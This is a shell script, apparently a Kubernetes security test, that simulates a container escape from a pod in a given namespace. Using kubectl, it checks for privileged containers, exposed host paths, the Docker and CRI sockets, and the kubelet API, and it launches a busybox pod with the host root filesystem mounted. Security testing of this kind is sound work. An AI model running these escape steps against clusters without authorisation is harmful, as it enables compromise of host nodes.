#!/bin/sh
set -eu

# Attempts container escape techniques
# This simulates an attacker trying to break out of a container

namespace="${1:-frontend}"

echo "[ATTACK] Container Escape Attack"
echo "[INFO] Target namespace: $namespace"

# Step 1: Find a pod
pod_name=$(kubectl get pods -n "$namespace" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
if [ -z "$pod_name" ]; then
    echo "[ERROR] No pods found in namespace $namespace"
    exit 1
fi

echo "[INFO] Target pod: $pod_name"

# Step 2: Check for privileged container
echo "[ATTACK] Checking if container is privileged..."
kubectl get pod "$pod_name" -n "$namespace" -o jsonpath='{.spec.containers[0].securityContext.privileged}' 2>/dev/null && \
    echo "[VULNERABLE] Container is privileged!" || \
    echo "[INFO] Container is not privileged"

# Step 3: Try to access host filesystem
echo "[ATTACK] Attempting to access host filesystem..."
kubectl exec -n "$namespace" "$pod_name" -- ls -la /host 2>/dev/null || \
kubectl exec -n "$namespace" "$pod_name" -- ls -la /hostroot 2>/dev/null || \
kubectl exec -n "$namespace" "$pod_name" -- ls -la /var/lib/docker 2>/dev/null || \
echo "[BLOCKED] Host filesystem not accessible"

# Step 4: Try to access host network
echo "[ATTACK] Checking host network access..."
kubectl exec -n "$namespace" "$pod_name" -- ip addr show 2>/dev/null | grep -E "inet.*eth0" || echo "[INFO] Cannot check network interfaces"

# Step 5: Try to access host processes
echo "[ATTACK] Attempting to access host processes..."
kubectl exec -n "$namespace" "$pod_name" -- ps aux 2>/dev/null | head -20 || echo "[INFO] Cannot list processes"

# Step 6: Try to access Docker socket
echo "[ATTACK] Attempting to access Docker socket..."
kubectl exec -n "$namespace" "$pod_name" -- ls -la /var/run/docker.sock 2>/dev/null && \
    echo "[VULNERABLE] Docker socket accessible!" || \
    echo "[BLOCKED] Docker socket not accessible"

# Step 7: Try to access CRI socket (containerd/cri-o)
echo "[ATTACK] Attempting to access CRI socket..."
kubectl exec -n "$namespace" "$pod_name" -- ls -la /run/containerd/containerd.sock 2>/dev/null || \
kubectl exec -n "$namespace" "$pod_name" -- ls -la /var/run/crio/crio.sock 2>/dev/null || \
echo "[BLOCKED] CRI socket not accessible"

# Step 8: Try to mount host paths
echo "[ATTACK] Attempting to create pod with host path mount..."
kubectl run escape-test-$(date +%s) \
    --image=busybox \
    --namespace="$namespace" \
    --restart=Never \
    --overrides='{"spec":{"containers":[{"name":"test","image":"busybox","volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/","type":"Directory"}}]}}' \
    --rm -i -- ls /host 2>/dev/null && \
    echo "[SUCCESS] Host path mounted!" || \
    echo "[BLOCKED] Cannot mount host path"

# Step 9: Try to access kubelet API
echo "[ATTACK] Attempting to access kubelet API..."
node_name=$(kubectl get pod "$pod_name" -n "$namespace" -o jsonpath='{.spec.nodeName}' 2>/dev/null || echo "")
if [ -n "$node_name" ]; then
    kubectl exec -n "$namespace" "$pod_name" -- curl -k "https://$node_name:10250/pods" 2>/dev/null | head -c 200 && echo "..." || echo "[BLOCKED] Kubelet API not accessible"
fi

echo "[COMPLETE] Container escape attack finished"

